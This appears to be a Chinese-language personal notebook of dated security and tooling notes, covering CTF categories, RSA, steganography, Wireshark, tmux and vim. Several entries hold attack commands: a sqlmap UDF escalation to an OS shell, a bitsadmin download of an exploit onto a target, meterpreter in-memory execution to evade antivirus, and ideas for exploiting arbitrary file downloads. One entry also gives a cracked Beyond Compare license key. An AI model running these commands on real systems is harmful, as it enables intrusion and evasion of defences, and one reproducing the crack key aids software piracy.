### 4月23日

```
sqlmap 多个脚本使用：
--tamper "nonrecursivereplacement,multiplespaces.py"
```

### 4月21日

```
sqlmap -d "mysql://root:mysql\_2018@172.18.0.4:3306/mysql" --os-shell --no-cast
知道mysql的密码，且支持外联的情况下：直接sqlmap连接mysql进行UDF提权，返回os-shell
```

### 4月18日

```
正则表达式与通配符不一样,它们表示的含义并不相同!
关于文件名使用通配符，如find
匹配内容使用正则，如grep 正则 通配符
```

### 4月16日

```
Windows中cmd.exe远程执行命令，多用于webshell：
cmd.exe /c net user
```

### 4月16日

```
Windows利用bitsadmin命令将exp上传到目标机
bitsadmin /transfer n http://xxx.xxx.xxx/xxx.exe C:\xxx\xxx.exe
```

### 3月31日

```
选择两个大素数p和q，计算出模数N = p * q
计算φ = (p−1) * (q−1) 即N的欧拉函数，然后选择一个e (1<e<φ)，且e和φ互质
取e的模反数为d，计算方法: e * d ≡ 1 (mod φ)
对明文m进行加密：c = pow(m, e, N)，得到的c即为密文
对密文c进行解密，m = pow(c, d, N)，得到的m即为明文

整理一下得到我们需要认识和记住的参数
p 和 q ：大整数N的两个因子（factor）
N：大整数N，我们称之为模数（modulus）
e 和 d：互为模反数的两个指数（exponent）
c 和 m：分别是密文和明文，这里一般指的是一个十进制的数
然后我们一般称
（N，e）：公钥
（N，d）：私钥
```

### 3月29日

CTF常见题型:

```
CTF比赛通常包含的题目类型包括MISC、PPC、CRYPTO、PWN、REVERSE、WEB、STEGA。
MISC(Miscellaneous)类型，即安全杂项，题目或涉及流量分析、电子取证、人肉搜索、数据分析等等。
PPC(Professionally Program Coder)类型，即编程类题目，题目涉及到编程算法，相比ACM较为容易。
CRYPTO(Cryptography)类型，即密码学，题目考察各种加解密技术，包括古典加密技术、现代加密技术甚至出题者自创加密技术。
PWN类型，PWN在黑客俚语中代表着攻破、取得权限，多为溢出类题目。
REVERSE类型，即逆向工程，题目涉及到软件逆向、破解技术。
STEGA(Steganography)类型，即隐写术，题目的Flag会隐藏到图片、音频、视频等各类数据载体中供参赛者获取。
WEB类型，即题目会涉及到常见的Web漏洞，诸如注入、XSS、文件包含、代码执行等漏洞。
```

### 3月28日

```
通俗的讲，RSA的公钥和私钥都可以用来加密或解密--只要能保证用A加密，就用B解密就行。至于A是公钥还是私钥，不同的情形下不同。

举两个例子：
1、把某个消息发给老王，不想被其他人知道，就可以用老王的公钥加密消息。因为只有他知道自己私钥，所以这个消息只有他本人才能用私钥解密消息；
2、自己想发布一个消息，需要通过一个技术手段来保证是自己发布，而不是别人伪造的。可以用自己的私钥加密发布的消息。其他人收到消息后，用自己的公钥解密消息，看看解密的内容是否一致。如果一致的话，则确定是自己发布的消息。因为只有自己的公钥才能解开你的私钥加密的内容。
```

### 3月26日

```
二进制 Binary system
八进制 Octal number system 
十进制 Decimal system 
十六进制 Hexadecimal
```

### 3月17日

```
i386就是32位的 如果cpu只支持32位的 不支持64位的 就下载这个
amd64就是64位的
不要以为i386只能用于intel的cpu，amd64只能用于amd的cpu。别被字面意思所迷惑。
```

### 3月16日

```
在用linux命令时候， 我们经常需要同时执行多条命令， 那么命令之间该如何分割呢？
分号： 顺序地独立执行各条命令， 彼此之间不关心是否失败， 所有命令都会执行。
&&  ： 顺序执行各条命令， 只有当前一个执行成功时候， 才执行后面的。
```

### 3月14日

```
nohup是永久执行，&是指在后台运行
```

### 3月12日

```
meterpreter > execute -H -m -d calc.exe -i -f /Users/go0s/Desktop/cmd.exe 
Process 4180 created.
Channel 7 created.

替换calc的进程内存为cmd.exe就可以bypass杀软了？

这个小技巧的具体原理就是系统calc.exe,然后在初始化完成还没进入入口的时候挂起，然后内存替换成我们的exe，这样看起来所有的一切都是calc.exe

例3：直接从内存中执行攻击端的可执行文件 
execute -H -m -d calc.exe -f wce.exe -a “-o foo.txt” 
1) -d选项设置需要显示的进程名 
2) 可执行文件(wce.exe)不需要在目标机上存储，不会留下痕迹
```

###  3月10日

```
linux提权基本就几条路。要么内核溢出从内核态丢出来一个用户态顶级权限的shell
要么利用已有的高权限程序缺陷(tomcat提权)来执行命令/写入有SUID权限位的可执行程序
要么类似于脏牛。修改有SUID位的程序内容
除了溢出。剩下的就是LD_PRELOAD/SUID。花式利用
```

###  3月8日

```
上帝解释道：“ 你们人脑同时能处理的东西是有限的， 所以要把一个大系统给分解，变成几个相对独立的部分，这样我们的大脑每次只关注某一方面，暂时忽略其他的，就能够掌控了。”

针对一个方向，深入下去
```

### 3月8日

```
2. HTTP 安全响应头

比如，CSP 这个策略，已经发展这么多年的安全策略，普适度居然还那么低。这个安全策略，可以让你严格限制 JavaScript 执行的区域，比如不允许在当前页面的 HTML 里内嵌执行，只允许远程加载一个白名单域名内的 js 文件来执行 JavaScript。多么漂亮的安全策略，五年前我们那本书最后一章节就大篇幅介绍了...
大家可以直接打开 Google、Twitter、知乎的首页，在“开发者工具”里看看响应头部里的这个字段：Content-Security-Policy，这就是 CSP，学学呀。
同理可以学学其他安全头部，特点都是 X- 开头的响应头部。
```

### 3月6日

```
当遇到一个任意文件下载时，我们的一般利用思路:
下载常规的配置文件，例如: ssh,weblogic,ftp,mysql等相关配置
下载各种.log文件，从中寻找一些后台地址，文件上传点之类的地方，如果运气好的话会获得一些前辈们的后门。
下载web业务文件进行白盒审计，利用漏洞进一步攻入服务器。
```

### 3月4日

```
红桃L  15:31:50
ndk的本质是library
红桃L  15:32:01
Windows 下是 dll
红桃L  15:32:06
linux是so
红桃L  15:32:11
然后
红桃L  15:32:26
当android程序启动的时候
红桃L  15:32:32
java层开始
红桃L  15:32:48
java代码调用jvm虚拟机开始启动
红桃L  15:32:56
这个是sdk
珍惜  15:33:05
这些我知道
红桃L  15:33:08
ndk是本地代码通过虚拟机
红桃L  15:33:18
联系到java
红桃L  15:33:35
jvm是java  与c的媒介
红桃L  15:33:47
jni就是媒介的编程规则
珍惜  15:33:58
明白这些
红桃L  15:34:04
通过对象式的c去访问java里的东西
珍惜  15:34:06
我很好奇那个mk文件怎么事
红桃L  15:34:16
有两种mk
珍惜  15:34:26
我没学c++只学过c
红桃L  15:34:26
一种是传统的linux下的makefile
红桃L  15:34:35
写c的时候
红桃L  15:34:53
linu小，会用  比如  gcc工具链
红桃L  15:35:08
去编译  链接  装载  源文件
红桃L  15:35:35
makefile就是构建这一套动作的脚本文件
红桃L  15:35:50
就像是文件编译构建方法
红桃L  15:36:05
只不过在android中
红桃L  15:36:14
加入了新的构建方式
红桃L  15:36:16
cmake
红桃L  15:36:28
这个和makefile根本不一样
红桃L  15:36:56
是另一套构建脚本，千万别和makefile搞混
红桃L  15:37:09
虽然最终目的一样，但是细节不同
红桃L  15:37:32
cmake把  我们在ide里编写好的源文件
红桃L  15:38:03
通过  add_library{  x   x    x    }
珍惜  15:38:08
原来这种两种东西
红桃L  15:38:21
构建成动态链接库共享库
珍惜  15:38:23
你们现在开发用的是cmake，还是make file
红桃L  15:38:31
对，当时我也蒙逼了好久
红桃L  15:38:40
我是用cmake
红桃L  15:38:56
因为android本身就是推荐cmake
珍惜  15:39:12
我说的mk文件其实是makefile是吧
红桃L  15:39:28
makefile  还有jni建立文件  那些  网上有好多博文
红桃L  15:39:34
容易混淆
珍惜  15:39:35
Ec用的mk文件都是makefile
红桃L  15:39:41
对
红桃L  15:39:56
AS  android stiodu
珍惜  15:39:58
明白了一些
红桃L  15:40:02
两种都可以
红桃L  15:40:08
推荐使用cmake
红桃L  15:40:16
不麻烦，效果一样
红桃L  15:40:25
ndk说一下
珍惜  15:40:35
我自动生成那个没有mk文件就是，cmake形式是吧
红桃L  15:40:52
就是android官方封装好的一套 ndk库  
这些你不用编译
红桃L  15:41:05
是已经烧录在手机设备里的，直接调用就可以了
红桃L  15:41:12
对   cmake
红桃L  15:41:34
就在最外层
红桃L  15:41:40
你看看这个文件名
红桃L  15:41:45
CMAKELIST
红桃L  15:41:52
cmakelist  这个文件
红桃L  15:42:06
就是通过这儿构建的
红桃L  15:42:46
其中

#   后面是注释  可以全部删掉
珍惜  15:42:47
那我很好奇
珍惜  15:42:53
我看到了
红桃L  15:42:57
恩
珍惜  15:43:08
为啥我看帖子
珍惜  15:43:12
有的教程。
珍惜  15:43:17
Studio jni
红桃L  15:43:24
是是
珍惜  15:43:26
他们用的还是那种创建mk的方式
红桃L  15:43:30
这个我也看到过
珍惜  15:43:37
是不是那种太落后了
红桃L  15:43:45
说什么在java下面建立一个jni文件夹
珍惜  15:43:52
对
珍惜  15:43:58
根本没必要吧
红桃L  15:44:03
其实建立什么文件夹更本无所谓
珍惜  15:44:08
我看人家官方的cmake形式
红桃L  15:44:08
我亲自试过
珍惜  15:44:14
根本没有那些
红桃L  15:44:20
根本就是胡整
珍惜  15:44:21
我就感觉这些又说到
珍惜  15:44:33
兄弟，出偏博客吧
红桃L  15:44:35
把linux的形势放进androird
红桃L  15:44:42
[表情]
珍惜  15:44:51
这些东西学安卓的都不知道
红桃L  15:45:07
jni文件夹    makefile一级一级建  
珍惜  15:45:08
我就知道，ec下的jni开发，需要mk文件
红桃L  15:45:12
这些都不应该存在
红桃L  15:45:17
对
红桃L  15:45:25
ec下转过来都这么干的
红桃L  15:45:34
所以他们在android下也这么干
红桃L  15:45:44
其实这样是自找麻烦
红桃L  15:46:24
两种当食物makefile构建是ec转过来构建的一种方式，根本不推荐
红桃L  15:46:36
两种方式makefile构建是ec转过来构建的一种方式，根本不推荐
珍惜  15:47:38
Ndk自带cmake编译形式，ec的是用的makefile  编译形式，需要mk文件，网上有很多帖子用的都是后者，其实是自找麻烦，
红桃L  15:48:20
对
红桃L  15:48:43
浪费我当时那么多时间，真tm全是转帖的博客
珍惜  15:49:16
全明白了
珍惜  15:49:20
受教
红桃L  15:49:23
还是得自己试，博客不可全信
珍惜  15:49:27
我真心的觉得
红桃L  15:49:37
[表情]
珍惜  15:49:45
你应该出个帖子，我帮你，放在好的博客上
```

### 2月12日

```
/usr/bin
/usr/local/bin

这两个目录中，/usr/bin是用来存储系统应用程序，受到分发管理工具的控制，而/usr/local/bin存储用户自己安装的程序，这部分不会受自己控制，不会因为系统升级导致的覆盖等改变。
```

### 2月12日

```
TWRP是国外android爱好者开发的一款工具，全名是：TeamWin Recovery Project

主要作用包括刷机（cm7、cm9、miui等），备份，恢复等……在你变砖头，修复的时候 TWRP是必不可少的工具。
```

### 2月10日

```
ARM是一种指令集,X86也是一种指令集

ARM是一种指令集,知识产权属于(ARM公司),X86也是一种指令集,X86指令集的知识产权属于Intel公司,ARM是精简指令集（RISC），X86使用的是复杂指令集（CISC)。

ARM推出指令集的同时,也推出了指令集的实现形式叫Cortex-A等系统架构,

当然如果有实力可以不使用指导的系统架构来做CPU(简单地说是CPU,实际是上核心),可以自己做架构(如高通,三星),

Intel的使用X86的指令集,自己做架构然后做出CPU来叫(奔腾,酷睿,I3),使用ARM指令集同进也使用ARM公司的架构做出的CPU有海思,使用ARM指令集不使用ARM公司架构的有高通系列CPU,苹果的CPU
```

### 2月7日

```
应用签名的主要作用有两个，第一个是检验安装包是否被修改，第二个是用于确认签名者的身份。
```

### 2月3日

TCP三次握手

```
TCP还有有一个名叫Push(PSH)的标志位

当PSH标志位为1时意味着有数据的传输，我们可以通过分组详情中注意到TCP层下面还有一个Data字段，Data字段就是这个数据包所包含的数据

A主动打开本地一个端口，向B发送一个SYN标志位为1，seq=x的包。B在监听一个端口，当这个端口收到A发送的第一个包带有SYN标志位，B会向A返回一个SYN，ACK标志位均为1，且seq=y，ack=x+1的数据包，当A收到这个包时，A向B发送确认ACK为1，seq=x+1，ack=y+1。然后TCP连接建立双方可以通信。

A(主动建立连接的一方)主动断开TCP连接。A发送一个FIN标志位置为1，seq=u的数据包，并进入FIN-wait状态，此时仍可以接收B尚未传输结束的数据。B接受到之后发送FIN，ACK，标志知道连接即将释放，并进入CLOSE-wait状态，A接受到B的FIN，向B发送一个ACK，确认连接断开，A在等待极短的时间后断开连接。B接受到ACK之后断开连接。
```

![tcp三次握手-1.jpg](./src/tcp三次握手-1.jpg)

![tcp三次握手-2.jpg](./src/tcp三次握手-2.jpg)

### 2月2日

```
在我们获得了数据包之后，这些客户端和AP之间的通信是被加密了的，但是我们如果知道SSID和无线密码可以解密这些流量。

wireshark官网提供了这样一个现在工具WPA-PSK生成：https://www.wireshark.org/tools/wpa-psk.html

我们可以在wireshark的 编辑 - 首选项 - Protocol(协议) - IEEE802.11 - Decryption Keys导入它：
```

![wireshark-wifi-1.jpg](./src/wireshark-wifi-1.jpg)

![wireshark-wifi-2.jpg](./src/wireshark-wifi-2.jpg)

### 2月1日

```
FTP当返回码是230的时候用户成功登录。

应用过滤器ftp.response.code==230:
```

### 1月28日

Wireshark 抓取 SSL 包

```
Firefox 和 Chrome 都支持NSS Key Log。要想启用NSS LOG，必须要配置系统环境变量中SSLKEYLOGFILE。

[Go0s]: ~

➜ export SSLKEYLOGFILE=/Users/go0s/OtherAPP/bin/sslkeylog.log

[Go0s]: ~

➜ open /Applications/Google\ Chrome.app

然后倒入log，进行抓包

在过去的话，如果我们拥有的该传输会话的私钥的话我们还是可以将它提供给WireShark来让其对这些加密数据包进行解密 的，但这已经是想当年还用RSA进行网络数据加密的年代的事情了。当今大家都已经逐渐拥抱前向加密技术PFS 的时代了，所以该方法就不再适用了。因为前向加密技术的目的就是让每个数据交互都使用的是不同的私钥，所以你像以前RSA时代一样想只用一个私钥就能把整个session会话的网络数据包都破解出来的话是不可能的了。

但如果主办方给了RSA的key文件，也可以直接导入；
```

![wireshark-ssl-1.jpg](./src/wireshark-ssl-1.jpg)

![wireshark-ssl-2.jpg](./src/wireshark-ssl-2.jpg)

### 1月26日

```
多媒体文件隐写『Steganography』

一、音频『WAV&MP3格式』

1. 众所周知的摩尔斯电码【lakey制作，Audacity】

2. 利用MP3stego进行的数据隐写 —> 需要密码

3. 频谱图【Audacity】—> 看频谱，调频率

二、视频『MP4格式』

1. 通过分离视频文件【foremost】—> 多为隐藏一张图片，主要在图片里做文章

附件：

用MP3Stego进行加密解密：

加密：encode -E 加密文本 -P 密码 wav文件 mp3文件

解密：decode -X -P 密码 mp3文件

```

### 1月25日

```
电子文档隐写『Steganography』

一、在Word中隐藏数据『DOC格式』

1. 利用隐藏文本功能进行隐写【Word && WPS】—> #Word：偏好设置 -> 视图# && #WPS：File文件->Tool工具->Option选项#，找到隐藏文字功能，选择这个功能，点击保存

2. word文档的xml转换【7z】—> 直接解压，或者先使用strings判断下

二、PDF文件中的信息隐藏『PDF格式』

1. 常用工具【wbStego4open】，可以把文件隐藏到BMP，TXT，HTM和PDF文件中

2. 需要密码

```

### 1月24日

```
一、附加式的图片隐写

1. 添加字符串【strings】—> 数据末
2. 图种形式的隐写【binwalk -e && foremost】—> 按文件头尾位置分割

二、基于文件结构的图片隐写『PNG格式』

3. 高度被修改引起的隐写【010editor】—> IHDR『文件头数据块』—>修改struct 
4. PNG_CHUNK_IHDR ihdr中高度值后重新校验union CTYPE type类型和struct PNG_CHUNK_IHDR ihdr数据的CRC32值
4. 隐写信息以IDAT块加入图片【pngcheck && IDAT.py】—> IDAT『多个数据块类型的数据块，即有多个』—> 先pngcheck -v检查图片，使用附件中IDAT.py脚本提取flag

三、基于LSB原理的图片隐写『Least Significant Bit 最低有效位』

5. 简单的LSB隐写【Stegosolve && PS】—> 切换通道并查看，或者使用PS直接滤镜库切换滤镜并查看
6. 有一点难度的LSB隐写『BMP格式』【Stegosolve && LSB.py】—> 使用Stegosolve寻找痕迹，如RGB最低位都出现相同异相，然后再通过LSB.py提取隐写内容

四、基于DCT域的JPG图片隐写『JPG格式』

7. DCT『Discrete Cosine Transform 离散余弦变换』，常见的隐写算法有JSteg、JPHide、Outguess、F5等，使用【Stegdetect】检测
8. 针对Jphide算法【JPHS】，需要密码
9. 针对Outguess算法【Outguess】，需要密码

五、数字水印的隐写『digital watermark』

10. 频域盲水印隐写【watermark.py && Matlab】—> watermark.py需要加水印的目标图以及原图才可提取水印内容 && Matlab只需要加水印的目标图

六、图片容差的隐写

11. 容差比较的隐写【beyond compare && PS】—> beyond compare图片比较，选择容差模式 && PS简单尝试更改两张图片样式

```

### 1月22日

Beyond Compare 4 license

```
This can be used in Mac by using following trick:
1、Open trial.key at path: /Applications/Beyond\ Compare.app/Contents/Resources/trial.key
2、Replace content of trial.key with:
--- BEGIN LICENSE KEY ---
H1bJTd2SauPv5Garuaq0Ig43uqq5NJOEw94wxdZTpU-pFB9GmyPk677gJ
vC1Ro6sbAvKR4pVwtxdCfuoZDb6hJ5bVQKqlfihJfSYZt-xVrVU27+0Ja
hFbqTmYskatMTgPyjvv99CF2Te8ec+Ys2SPxyZAF0YwOCNOWmsyqN5y9t
q2Kw2pjoiDs5gIH-uw5U49JzOB6otS7kThBJE-H9A76u4uUvR8DKb+VcB
rWu5qSJGEnbsXNfJdq5L2D8QgRdV-sXHp2A-7j1X2n4WIISvU1V9koIyS
NisHFBTcWJS0sC5BTFwrtfLEE9lEwz2bxHQpWJiu12ZeKpi+7oUSqebX+
--- END LICENSE KEY -----
3、Save trial.key file & restart Beyond Compare app
4、Enjoy!
```

### 1月22日

```
下载：brew install tmux
介绍：http://blog.csdn.net/lihao21/article/details/68958515
设置：https://www.cnblogs.com/lakeone/p/5424609.html
美化：https://github.com/gpakosz/.tmux
配置：
.tmux.conf
# https://github.com/PytLab/dotfiles/blob/master/.tmux.conf

# Set tmux prefix to <C-a>
set -g prefix C-a
unbind C-b

# -- bind keys -- #
# Set source-file
bind r source-file ~/.tmux.conf \; display ".tmux.conf Reloaded!"
# Split pane.
unbind '"'
bind | splitw -h
unbind '%'
bind _ splitw -v

# Copy mode
# copy-mode to vi mode
setw -g mode-keys vi
# enter copy mode
bind Escape copy-mode
# paste buffer
bind C-p pasteb
# select (v)
bind-key -T copy-mode-vi v send-keys -X begin-selection
# copy (y)
bind-key -T copy-mode-vi y send-keys -X copy-selection-and-cancel

# Map panel switch.
# Up
bind-key k select-pane -U
# Down
bind-key j select-pane -D
# left
bind-key h select-pane -L
# right
bind-key l select-pane -R

# Resize panel size.
bind < resize-pane -L 10
bind > resize-pane -R 10
bind - resize-pane -D 10
bind + resize-pane -U 10

#设置status-bar颜色 
set -g status-fg white 
set -g status-bg black 
#设置窗口列表颜色 
setw -g window-status-fg cyan 
setw -g window-status-bg default 
setw -g window-status-attr dim
#设置当前窗口在status bar中的颜色 
setw -g window-status-current-fg white 
setw -g window-status-current-bg red 
setw -g window-status-current-attr bright 
#设置status bar格式 
set -g status-left-length 40 
set -g status-left "#[fg=green]Session: #S #[fg=yellow]#I #[fg=cyan]#P" 
set -g status-right "#[fg=cyan]%d %b %R" 
set -g status-interval 60 
set -g status-justify centre
Session：区分station，系统
查看当前有哪些session：tmux ls
0: 1 windows (created Fri Jul 2820:31:08 2017) [80x22] (attached)

使用C - a d命令可以退出一个session
进入这个session：tmux attach -t0

重命名：tmux rename-session -t0 xxxxxxx
新建session：tmux new -s yyyyyy
进入名为yyyyyy的session：tmux attach -t yyyyyy
Window：区分各类工作，窗口
创建新窗口：C+a c
关闭当前窗口：&
切换窗口：数字键
重命名当前窗口：，
Pane：区分各个工作区域，面板
看配置文件
文本操作参考vim
```

### 1月18日

终端记录分享工具：asciinema

```
网址：https://asciinema.org

使用：https://macplay.github.io/cool-software/add-asciinema-support-for-blog
 
安装：brew install asciinema

录制：asciinema rce

上传：默认上传到他们网站，并返回一个url；
```

### 1月14日

ZSH

```
参考：
https://www.zhihu.com/question/29977255
改变Bash shell使用Zsh
Mac系统自带了zsh, 一般不是最新版，如果需要最新版可通过 Homebrew 来安装
brew install zsh
可通过 zsh --version 命令查看 zsh 的版本
修改默认 Shell
注意：这里的路径取决于你下载后存放的路径。
1、在 /etc/shells 文件中加入如下一行
/bin/zsh
2、然后运行命令
chsh -s /bin/zsh
3、还差一步，就是添加Oh My ZSH，安装方法如下：
sh -c "$(curl -fsSL https://raw.github.com/robbyrussell/oh-my-zsh/master/tools/install.sh)"
环境变量中会出现：
ZSH=/Users/go0s/.oh-my-zsh
完成安装.
主题修改：.zshrc —> ZSH_THEME="robbyrussell"
然后加载一下：source .zshrc
主题目录：~/.on-my-zsh/theme
```

### 1月12日

wireshark监听网卡失败

```
sudo chown go0s /dev/bpf*
```

### 1月8日

msf docker

```
http://www.freebuf.com/sectool/104524.html

docker run -it -p 4444:4444 -v ~/.msf4:/root/.msf4 -v /tmp/msf:/tmp/data remnux/metasploit

在这个例子中，我直接在一个临时的容器上运行“remnux/metasploit”，“-it”让你能够通过shell与容器进行交互。
为了保存容器的相关数据，我使用“-v”参数来将容器目录映射到我主机的目录上。我将使用”~/.msf4”目录来存放Metasploit Framework的配置文件。主机上的“/tmp/msf”目录将会存储其他数据，比如你可能从目标系统获取的数据，截图等。
```

### 1月4日

vim常用快捷键

```
参考：http://blog.csdn.net/u014015972/article/details/50708360
vim常用快捷键：
光标移动：
Ctrl + d               // 向前移动半屏，D指Down
Ctrl + u               // 向后移动半屏，U指Up
z + 回车               // 把当前行移动到屏幕顶部
G (Ctrl + g)           // 移动到文件的尾部
gg                     // 移动到文件的头部
nG (n Ctrl + g)       // 移动到第n行
左：h
下：j
上：k
右：l
当前行行首：0 (^)
当前行行尾：$
前一个单词词首：b
后一个单词词首：w
后一个单词词尾：e
文本搜索：
/pattern           // 向前搜索模式，pattern代指要搜索的内容
?pattern           // 向后搜索模式
n                             // 重复上次搜索（向行号大的方向）
N                             // 反方向重复上次搜索
编辑模式：
快捷键PasteDeleteCopyLine行pddyyWord词pdwywLetter字pdlyl
:%d 删除全部内容
块编辑：
v 可进入visual模式，使用标准快捷键移动光标可选择文本块
ctrl + v 列编辑
d(x) 删除(剪切)
p 粘贴
选中即复制
插入：
i(a) 在当前位置生前（后）插入
I 在当前行首插入
A 在当前行尾插入
o 在当前行之后插入一行
O 在当前行之前插入一行
退出：
Esc
ctrl + [ 官方推荐替换Esc
```

### 1月4日

ubuntu 16.04 搭建shadowsoc

```
ubuntu 16.04 搭建shadowsocks服务
1. shadowsocks 服务器安装
更新软件源
sudo apt-get update1
然后安装 PIP 环境
sudo apt-get install python-pip1
直接安装 shadowsocks
sudo pip install shadowsocks
2. 运行 shadowsocks 服务器
启动命令如下：如果要停止运行，将命令中的start改成stop。
sudo ssserver -p 8388 -k password -m aes-256-cfb -d start1
也可以使用配置文件进行配置，方法创建/etc/shadowsocks.json文件，填入如下内容：
{
  "server":"my_server_ip",
  "server_port":8388,
  "local_address": "127.0.0.1",
  "local_port":1080,
  "password":"mypassword",
  "timeout":300,
  "method":"aes-256-cfb"
}123456789
各字段的含义：
nameinfoserver服务器 IP (IPv4/IPv6)，注意这也将是服务端监听的 IP 地址server_port服务器端口local_port本地端端口password用来加密的密码timeout超时时间（秒）method加密方法，可选择 “bf-cfb”, “aes-256-cfb”, “des-cfb”, “rc4″, 等等。默认是一种不安全的加密，推荐用 “aes-256-cfb”
TIPS: 加密方式推荐使用rc4-md5，因为 RC4 比 AES 速度快好几倍，如果用在路由器上会带来显著性能提升。旧的 RC4 加密之所以不安全是因为 Shadowsocks 在每个连接上重复使用 key，没有使用 IV。现在已经重新正确实现，可以放心使用。更多可以看 issue。
创建完毕后，赋予文件权限：
sudo chmod 755 /etc/shadowsocks.json1
为了支持这些加密方式，你要需要安装
sudo apt–get install python–m2crypto1
然后使用配置文件在后台运行：
sudo ssserver -c /etc/shadowsocks.json -d start
3. 配置开机自启动
编辑 /etc/rc.local 文件
sudo vi /etc/rc.local1
在 exit 0 这一行的上边加入如下
/usr/local/bin/ssserver –c /etc/shadowsocks.json1
或者 不用配置文件 直接加入命令启动如下：
/usr/local/bin/ssserver -p 8388 -k password -m aes-256-cfb -d start1
到此重启服务器后，会自动启动。
注意 ：需要服务器开启 8388 端口
```

### 1月4日

npm-node包管理

```
首先换淘宝源，顺便下载cnpm来代替npm：
$ npm install -g cnpm --registry=https://registry.npm.taobao.org
安装模块：
$ npm install
最好直接利用淘宝源（优先）：
$ cnpm install
启动应用：
$ npm start
如果需要修改源代码，则必须重新编译源码：
$ npm run build
注释：
Node.js是JavaScript的一种运行环境，是对Google V8引擎进行的封装。是一个服务器端的javascript的解释器。
包含关系，nodejs中含有npm，比如说你安装好nodejs，你打开cmd输入npm -v会发现出啊线npm的版本号，说明npm已经安装好。
引用大神的总结:
其实npm是nodejs的包管理器（package manager）。我们在node.js上开发时，会用到很多别人已经写好的javascript代码，如果每当我们需要别人的代码时，都根据名字搜索一下，下载源码，解压，再使用，会非常麻烦。于是就出现了包管理器npm。大家把自己写好的源码上传到npm官网上，如果要用某个或某些个，直接通过npm安装就可以了，不用管那个源码在哪里。并且如果我们要使用模块A，而模块A又依赖模块B，模块B又依赖模块C和D，此时npm会根据依赖关系，把所有依赖的包都下载下来并且管理起来。试想如果这些工作全靠我们自己去完成会多么麻烦！
```

### 1月4日

```
Kali设置终端快捷键：

在设置中找到键盘（keyboard），添加快捷键，名字随意（Open Terminal）

命令为：gnome-terminal

快捷键设置：command+A

确定即可完成快捷键设置，这个不会冲突
```

### 1月4日

```
Mac OS X 系统自带的 grep 命令即便加上 --color 参数也是无法输出彩色文件名和行号的，在当前最新的 El Capitan 10.11.6 中仍然如此，因为 grep 版本太低了，GNU grep 2.5.3 以上版本才支持 Multiple colors 特性。
 
如果安装了 homebrew，在终端中输入以下命令安装 GNU grep：

brew tap homebrew/dupes/

brew install homebrew/dupes/grep

默认会安装为 /usr/local/bin/ggrep，在 bash或者zsh或者其他各种sh

做一个 alias 替换掉 grep 好了：

alias grep='ggrep -Hn --color=always'
```

### 1月2日

MAC 小命令

```
tldr 显示命令使用方法，相当于简单化man
http-server 快速启动服务器
loc 统计当前目录下各种代码行数
rg 将 Silver Searcher（类似于ack）的可用性与 GNU grep 高速相结合
mycli 为MySQL命令行客户端，提供语法高亮和提示功能的工具
mvim MacOS下的vim，单独app，可以复制到系统剪切板
x 功能强大的zsh解压插件extract，所有类型的文件解压一个命令x全搞定
htop 显示所有进程信息
httpie 类似curl，命令http
pandoc 文件格式转换神器
proxychains4 代理
socat 同nc，用于监听
upx 加壳
figlet ascii字符图像
kstool 全架构汇编转机器码
```

### 1月2日

```
hex也称为base16，意思是使用16个可见字符来表示一个二进制数组，编码后数据大小将翻倍,因为1个字符需要用2个可见字符来表示。

base32，意思是使用32个可见字符来表示一个二进制数组，编码后数据大小变成原来的8/5,也即5个字符用8个可见字符表示，但是最后如果不足8个字符，将用=来补充。

base64，意思是使用64个可见字符来表示一个二进制数组，编码后数据大小变成原来的4/3,也即3个字符用4个可见字符来表示。

hex编码不区分大小写，但是base32与base64是区分的。
```

![base64.png](./src/base64.png)

![base32.jpg](./src/base32.jpg)

![base16.png](./src/base16.png)

### 1月1日

我的burpsuite workflow：

```
1、生成GET数据包：复制url -> 打开burp -> repeater -> 右键paste url as request
2、生成POST数据包：生成一个GET数据包 -> 右键change request method
3、生成上传数据包：生成一个POST数据包 -> 右键change body encoding  -> 增加filename字段 -> 右键paste from file添加待上传的文件
4、发送真实数据包：chrome抓包 -> 复制数据包 -> 粘贴到repeater -> 增加target -> 发送
5、从数据包生成URL：任意数据包页面 -> 右键copy url
6、从数据包生成curl命令：任意数据包页面 -> 右键copy as curl command
7、从数据包生成html表单（可测CSRF漏洞）：任意数据包页面 -> 右键engagement tools -> generate csrf poc
```

### 2017年12月27日

```
*或者0.0.0.0 是对外开放，通过服务域名、ip可以访问的端口
127.0.0.1 只能对本机 localhost访问，也是保护此端口安全性
```

### 2017年12月9日

```
重定向命令的标准输出信息到/dev/null的语法如下所示：
 $ command > /dev/null

重定向命令的标准错误信息到/dev/null的语法如下所示：
 $ command 2>/dev/null

同时重定向命令的标准输出和标准错误的信息到/dev/null的语法如下所示：
 $ command &> /dev/null
 或 
 $ command >& /dev/null
 或 
 $ command > /dev/null 2>&1

同时将标准错误和标准输出进行重定向的语法如下所示： command &> filename 
command >& filename 
command > filename 2>&1 
command 2>&1 > filename
```

### 2017年11月25日

文件 MD5、SHA1、SHA256 计算

```
Linux

Linux 下有md5sum命令，sha1sum命令和sha256sum命令，使用方法如下

[Laily@laily-main ~]$ md5sum test.sql
e2fbae9d1c0a7232f8c6132ad6023554  test.sql
[Laily@laily-main ~]$ sha1sum test.sql
562cf79455fcff5eccd0549ba097e9fca98095f0  test.sql
[Laily@laily-main ~]$ sha256sum test.sql
6289a9562e84983304485759597813c9d3ba972fafb0fa08a196dc585730f5fc  test.sql

MAC

mac 下有md5命令和shasum命令，使用方法如下

#Laily@Laily:~/Downloads|⇒  md5 uuu.jpg
MD5 (uuu.jpg) = fbe79fbbb91e3f897372fad55d554ec8
#Laily@Laily:~/Downloads|⇒  shasum -a 1 uuu.jpg
f0e7617dd09f0675abdd44045e382a121c42c250  uuu.jpg
#Laily@Laily:~/Downloads|⇒  shasum -a 256 uuu.jpg
0d0f4329bf3ae8627c3035e7db18fd7e98a1436d25e0faa5d5b42b44cdde335f  uuu.jpg
```

### 2017年11月18日

```
在magic_quotes_gpc=On的情况下，如果输入的数据有单引号（’）、双引号（”）、反斜线（）与 NUL（NULL 字符）等字符都会被加上反斜线。这些转义是必须的，如果这个选项为off，那么我们就必须调用addslashes这个函数来为字符串增加转义。

quotes 引号
slashes 斜线
```

### 2017年11月16日

```
➜  ~ echo 123 > 1.txt
➜  ~ lsattr 1.txt                                           -------------e-- 1.txt
➜  ~ chattr +i 1.txt                                        
➜  ~ lsattr 1.txt                                           ----i--------e-- 1.txt
➜  ~ rm 1.txt                                               
rm: cannot remove '1.txt': Operation not permitted
➜  ~ chattr -i 1.txt                                       
即可删除

➜  ~ mkdir 1                                                
➜  ~ mv 1.txt 1                                             
如果给目录加上锁，-i权限，则里面的文件都不能删除
```

### 2017年11月6日

```
基本正则表达式具有如下的元字符。
